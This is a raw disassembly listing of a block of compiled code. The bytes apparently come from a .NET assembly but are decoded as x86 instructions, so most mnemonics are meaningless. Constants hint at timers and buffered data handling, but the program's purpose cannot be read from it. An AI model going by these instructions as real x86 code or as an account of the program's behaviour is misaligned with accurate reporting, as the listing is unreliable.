  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 a4 23 00       	and    $0x23a472,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 b2                	jb     0x40302c
  40307a:	23 00                	and    (%eax),%eax
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 bc 23 00       	and    $0x23bc72,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
